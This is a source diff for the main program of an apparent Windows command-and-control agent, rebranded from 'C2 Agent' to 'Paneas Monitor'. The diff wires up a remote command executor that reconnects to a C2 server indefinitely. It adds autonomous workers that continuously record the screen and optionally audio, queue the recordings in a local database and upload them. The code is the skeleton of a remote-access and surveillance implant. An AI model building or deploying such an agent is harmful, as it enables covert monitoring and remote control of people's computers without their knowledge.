@@ -1,5 +1,7 @@
 using Agent;
 using Agent.Models;
+using Agent.Database;
+using Agent.Workers;
 
 namespace AgentApp
 {
@@ -8,33 +10,55 @@ namespace AgentApp
         static async Task Main(string[] args)
         {
             Console.WriteLine("╔═══════════════════════════════════════════╗");
-            Console.WriteLine("║  C2 Agent - Windows Command & Control    ║");
-            Console.WriteLine("║  POC - Sistema de Controle Remoto         ║");
+            Console.WriteLine("║  Paneas Monitor - C2 & Autonomous Agent  ║");
+            Console.WriteLine("║  POC - Sistema de Monitoramento           ║");
             Console.WriteLine("╚═══════════════════════════════════════════╝");
             Console.WriteLine();
 
-            // Configuration
+            // Load configuration from appsettings.json
+            var appConfig = ConfigManager.LoadFromFile();
+            Console.WriteLine($"Mode: {appConfig.Mode}");
+            Console.WriteLine();
+
+            // Legacy C2 Configuration
             var config = new AgentConfig
             {
-                ServerUrl = GetServerUrl(args),
+                ServerUrl = appConfig.C2.ServerUrl,
                 AgentId = GenerateAgentId(),
                 Hostname = Environment.MachineName,
-                ReconnectDelayMs = 5000,
+                ReconnectDelayMs = appConfig.C2.ReconnectDelaySeconds * 1000,
                 MaxReconnectAttempts = -1 // Infinite
             };
 
             Console.WriteLine($"Agent ID: {config.AgentId}");
             Console.WriteLine($"Hostname: {config.Hostname}");
-            Console.WriteLine($"Server URL: {config.ServerUrl}");
+            if (appConfig.C2.Enabled)
+            {
+                Console.WriteLine($"Server URL: {config.ServerUrl}");
+            }
             Console.WriteLine();
 
             // Define storage path for media files
-            string storageBasePath = Path.Combine(
-                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                "C2Agent"
-            );
+            string storageBasePath = string.IsNullOrEmpty(appConfig.Storage.BasePath)
+                ? Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "C2Agent")
+                : appConfig.Storage.BasePath;
 
             Console.WriteLine($"Storage Path: {storageBasePath}");
+            Console.WriteLine();
+
+            // Initialize database
+            string dbPath = Path.Combine(storageBasePath, appConfig.Database.Path);
+            var database = new DatabaseManager(dbPath);
+            Console.WriteLine($"Database: {dbPath}");
+            Console.WriteLine();
+
+            // Show queue stats
+            var stats = database.GetQueueStats();
+            Console.WriteLine("Queue Stats:");
+            foreach (var stat in stats)
+            {
+                Console.WriteLine($"  {stat.Key}: {stat.Value}");
+            }
             Console.WriteLine();
 
             // Create executor and SSE client
@@ -44,7 +68,48 @@ namespace AgentApp
                 commandTimeoutMs: 60000
             );
 
-            var sseClient = new SseClient(config, executor);
+            // Apply recording configuration
+            executor.VideoRecorder.SegmentSeconds = appConfig.Recording.SegmentSeconds;
+            executor.VideoRecorder.FPS = appConfig.Recording.FPS;
+            executor.VideoRecorder.VideoBitrate = appConfig.Recording.VideoBitrate;
+            executor.VideoRecorder.CaptureAudio = appConfig.Recording.CaptureAudio;
+
+            SseClient? sseClient = null;
+            if (appConfig.C2.Enabled)
+            {
+                sseClient = new SseClient(config, executor);
+            }
+
+            // Initialize Workers (Autonomous mode)
+            VideoRecorderWorker? recorderWorker = null;
+            UploadWorker? uploadWorker = null;
+
+            if (appConfig.Mode == "autonomous" || appConfig.Mode == "hybrid")
+            {
+                Console.WriteLine("[Workers] Initializing autonomous workers...");
+
+                // Recorder Worker
+                recorderWorker = new VideoRecorderWorker(executor.VideoRecorder, database)
+                {
+                    ContinuousMode = appConfig.Recording.Continuous,
+                    RecordingIntervalMinutes = appConfig.Recording.IntervalMinutes,
+                    RecordingDurationMinutes = appConfig.Recording.DurationMinutes
+                };
+
+                // Upload Worker
+                if (appConfig.Upload.Enabled)
+                {
+                    uploadWorker = new UploadWorker(database)
+                    {
+                        PollIntervalSeconds = appConfig.Upload.PollIntervalSeconds,
+                        MaxConcurrentUploads = appConfig.Upload.MaxConcurrentUploads,
+                        MaxRetries = appConfig.Upload.MaxRetries
+                    };
+                }
+
+                Console.WriteLine("[Workers] Workers initialized");
+                Console.WriteLine();
+            }
 
             // Start HTTP server for media preview (with recorder reference to prevent locked file access)
             var httpServer = new MediaHttpServer(
@@ -62,11 +127,14 @@ namespace AgentApp
                 Console.WriteLine("Preview functionality will not be available.");
             }
 
-            // Subscribe to log events
-            sseClient.OnLog += (sender, message) =>
+            // Subscribe to log events (C2 mode)
+            if (sseClient != null)
             {
-                Console.WriteLine(message);
-            };
+                sseClient.OnLog += (sender, message) =>
+                {
+                    Console.WriteLine(message);
+                };
+            }
 
             // Handle Ctrl+C gracefully
             var cts = new CancellationTokenSource();
@@ -78,46 +146,84 @@ namespace AgentApp
                 cts.Cancel();
             };
 
-            // Main loop with reconnect logic
-            int reconnectAttempt = 0;
-
-            while (!cts.Token.IsCancellationRequested)
+            // Start Workers
+            if (recorderWorker != null)
             {
-                try
-                {
-                    reconnectAttempt++;
+                recorderWorker.Start();
+            }
 
-                    if (reconnectAttempt > 1)
+            if (uploadWorker != null)
+            {
+                uploadWorker.Start();
+            }
+
+            Console.WriteLine("═══════════════════════════════════════════");
+            Console.WriteLine("  Agent running. Press Ctrl+C to stop.");
+            Console.WriteLine("═══════════════════════════════════════════");
+            Console.WriteLine();
+
+            // Main loop with reconnect logic (C2 mode)
+            if (appConfig.C2.Enabled && sseClient != null)
+            {
+                int reconnectAttempt = 0;
+
+                while (!cts.Token.IsCancellationRequested)
+                {
+                    try
                     {
-                        Console.WriteLine($"Tentativa de reconexão #{reconnectAttempt}...");
-                        await Task.Delay(config.ReconnectDelayMs, cts.Token);
+                        reconnectAttempt++;
+
+                        if (reconnectAttempt > 1)
+                        {
+                            Console.WriteLine($"Tentativa de reconexão #{reconnectAttempt}...");
+                            await Task.Delay(config.ReconnectDelayMs, cts.Token);
+                        }
+
+                        await sseClient.ConnectAsync(cts.Token);
+
+                        // If we reach here, connection was closed gracefully
+                        Console.WriteLine("Conexão encerrada pelo servidor");
                     }
-
-                    await sseClient.ConnectAsync(cts.Token);
-
-                    // If we reach here, connection was closed gracefully
-                    Console.WriteLine("Conexão encerrada pelo servidor");
-                }
-                catch (OperationCanceledException)
-                {
-                    // User requested shutdown
-                    break;
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine($"Erro de conexão: {ex.Message}");
-
-                    if (config.MaxReconnectAttempts > 0 && reconnectAttempt >= config.MaxReconnectAttempts)
+                    catch (OperationCanceledException)
                     {
-                        Console.WriteLine($"Máximo de tentativas ({config.MaxReconnectAttempts}) atingido. Encerrando...");
+                        // User requested shutdown
                         break;
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"Erro de conexão: {ex.Message}");
+
+                        if (config.MaxReconnectAttempts > 0 && reconnectAttempt >= config.MaxReconnectAttempts)
+                        {
+                            Console.WriteLine($"Máximo de tentativas ({config.MaxReconnectAttempts}) atingido. Encerrando...");
+                            break;
+                        }
                     }
                 }
             }
+            else
+            {
+                // Autonomous mode - just wait for cancellation
+                await Task.Delay(Timeout.Infinite, cts.Token);
+            }
 
             // Cleanup resources
+            Console.WriteLine();
+            Console.WriteLine("Stopping workers...");
+
+            if (recorderWorker != null)
+            {
+                await recorderWorker.StopAsync();
+            }
+
+            if (uploadWorker != null)
+            {
+                await uploadWorker.StopAsync();
+            }
+
             httpServer.Dispose();
             executor.Dispose();
+            database.Dispose();
 
             Console.WriteLine();
             Console.WriteLine("Agente encerrado.");
